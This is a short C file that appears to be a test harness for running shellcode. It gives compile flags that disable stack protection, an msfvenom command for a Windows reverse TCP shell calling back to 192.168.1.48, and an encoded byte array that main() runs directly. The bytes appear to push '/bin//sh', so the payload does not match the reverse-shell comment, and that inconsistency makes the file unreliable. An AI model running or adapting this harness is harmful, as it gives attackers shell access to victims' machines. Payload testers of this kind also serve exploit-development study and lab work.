// <Windows> i686-w64-mingw32-gcc test_shellcode.c -o shellcode
// <Linux> gcc -m32 -fno-stack-protector -z execstack test_shellcode.c -o shellcode

#include <stdio.h>
// msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.48 -f c -v code -b "\x00"
unsigned char code[] = "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x24\x2f\x3d\x2b\x2d\x30\x6f\x76\x27\x2d\x23\x7e\x7e\x2c\x50\x68\x2f\x62\x69\x6e\x68\x2f\x73\x68\x68\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5f\x24\x40\x3e\x2d\x60\x2a\x25\x22\x2d\x36\x60\x32\x70\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x47\x7e\x61\x2d\x78\x47\x24\x6f\x2d\x7e\x79\x7b\x7e\x50\x68\x41\x49\x41\x31\x54\xc3";
int main(int argc, char **argv)
{
   printf("Shellcode length: %lu\n", sizeof(code));

   void (*s)() = (void *)code;
   s();

   return 0;
}
